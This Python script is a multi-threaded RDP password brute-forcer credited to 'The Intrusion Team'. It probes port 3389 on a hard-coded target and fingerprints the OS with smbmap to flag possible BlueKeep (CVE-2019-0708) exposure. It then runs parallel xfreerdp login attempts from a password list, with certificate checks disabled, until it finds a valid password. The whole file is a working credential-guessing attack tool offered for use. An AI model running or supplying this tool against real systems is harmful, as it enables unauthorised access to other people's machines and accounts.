import subprocess
import concurrent.futures
from tqdm import tqdm
from colorama import Fore
import socket,sys

print(Fore.RED + """
╦╔═╗╔═╗╦ ╦
║╚═╗╠═╝╚╦╝
╩╚═╝╩   ╩ """ + Fore.WHITE + "Multi-Threaded RDP Bruteforcer V1.1 Developed by" + " \033[38;5;208mThe Intrusion Team\033[0m" + Fore.RESET)

# Configuration
host = '10.1.1.41'
port = 3389
usernames = ['IEUser']
user = 'IEUser'
passwords = []
max_workers = 20  # Specify the maximum number of workers here
password_found = False  # Shared variable to indicate if a password is found

vuln = ["IEWIN7","VISTA","XP","2008"]

# Check to see if RDP port is open
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    print("[" + Fore.RED + "Checking RDP Service" + Fore.RESET + "] " + Fore.WHITE +  f"port {port} is open" + Fore.RESET)
    s.close()
except socket.error:
    print("[" + Fore.RED + "Checking RDP Service" + Fore.RESET + "] " + Fore.WHITE +  f"port {port} is closed" + Fore.RESET)
    print("[" + Fore.RED + "Initiating Program Shutdown" + Fore.RESET + "] " + "Goodbye")
    sys.exit()
    
def rdp_login(username, password):
    global password_found
    if password_found:
        return None

    command = f'xfreerdp /v:{host} /u:{user} /p:{password} /tls-seclevel:0 /cert:ignore +auth-only'
    result = subprocess.getoutput(command)

    if 'status 0' in result:
        password_found = True
        return (username, password)

    if 'STATUS_ACCOUNT_LOCKED_OUT' in result:
        print("[" + Fore.RED + "Account Locked Out" + Fore.RESET + "] " + Fore.WHITE + username + Fore.RESET)

    return None


def main():
    global password_found

    print("[" + Fore.RED + "Target" + Fore.RESET + "] " + Fore.WHITE + host + Fore.RESET)
    print("[" + Fore.RED + "Bruteforcing Account" + Fore.RESET + "] " + Fore.WHITE + ''.join(usernames) + Fore.RESET)
    print("[" + Fore.RED + "Concurrent Workers" + Fore.RESET + "]", Fore.WHITE, max_workers, Fore.RESET)

    # Read passwords from a file
    with open('passwords.txt', 'r') as file:
        passwords = file.read().splitlines()
        print("[" + Fore.RED + "Login Attempts" + Fore.RESET + "]", Fore.WHITE, len(usernames) * len(passwords), Fore.RESET)

    # Generate login combinations
    login_combinations = [(username, password) for username in usernames for password in passwords]

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit RDP login tasks to the executor for all combinations
        futures = [executor.submit(rdp_login, username, password) for username, password in login_combinations]

        # Wait for the tasks to complete and show progress bar
        results = []
        with tqdm(total=len(futures), unit='passwords', desc="[Bruteforcing]") as pbar:
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is not None:
                    results.append(result)
                    executor.shutdown(wait=False, cancel_futures=True)  # Stop all tasks and logins
                    break
                pbar.update(1)

    for username, password in results:
        print("[" + Fore.RED + "Password Cracked" + Fore.RESET + "] " + Fore.WHITE + password + Fore.RESET)

# Uses smbmap to get OS version    
OS = subprocess.getoutput('smbmap -H ' + host + ' -v')
#print(OS)
if any(x in OS for x in vuln): # check vulnerable versions to bluekeep exploit
    print("[" + Fore.RED + "Service Might be Vulnerable" + Fore.RESET + "] " + Fore.WHITE + "to CVE-2019-0708" + Fore.RESET)
brute = input("[" + Fore.RED + "Initiate" + Fore.RESET + "] " + "Bruteforce Attack? Y/N ")
if brute.lower() == "y":
   main()
else:
    print("[" + Fore.RED + "Exiting " + Fore.RESET + "]" + " Happy Hacking")
    sys.exit()
